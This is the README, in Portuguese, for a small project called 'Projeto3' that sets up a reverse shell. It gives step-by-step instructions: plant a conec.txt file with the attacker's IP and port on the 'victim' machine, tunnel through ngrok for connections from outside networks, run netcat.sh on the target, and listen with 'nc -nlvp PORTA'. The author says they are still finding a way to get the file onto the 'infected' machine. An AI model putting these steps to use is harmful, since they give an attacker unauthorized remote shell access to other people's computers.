# Projeto3

Como usar o programa:
1- É necessário que na máquina da vítima tenha um arquivo chamado conec.txt que será colocado o IP do atacante e a porta para a conexão.
  (Ainda arrumando um jeito de colocar o arquivo na máquina "infectada".)

2- Dentro de conec.txt terão duas opções, a de apenas colocar o IP da rede interna e a porta (ex: 192.168.1.4 4444), ou para conexão com
  uma rede externa, será necessário usar o ngrok que o IP será fornecido ao abrir a conexão TCP (ex: tcp://0.tcp.sa.ngrok.io:14792 -> localhost:4444)
  , será necessário colocar o IP dentro de conec.txt juntamente com a porta (ex: 14792 4444). Caso seja rede interna, o arquivo conec.txt deverá
  ter apenas uma linha com o IP e porta, já caso seja rede externa, o arquivo precisará na primeira linha ter o IP e porta e uma segunda linha
  com qualquer coisa aleatória.

3- Para conseguir o IP do ngrok, crie uma conta em https://dashboard.ngrok.com/signup, confirme o email, baixe o ngrok na máquina do atacante
  https://ngrok.com/download, em seguida adicione o auth token da sua conta na máquina do atacante (ngrok config add-authtoken TOKEN).
  Para saber se está funcionando abra uma conexão TCP (ngrok tcp PORTA).

4- Se for ataque por redes diferentes, deixe a conexão TCP rodando, se não siga para o próximo passo.

5- Rode o arquivo netcat.sh

6- O atacante precisará ficar ouvindo na porta específica, esperando a conexão (nc -nlvp PORTA).
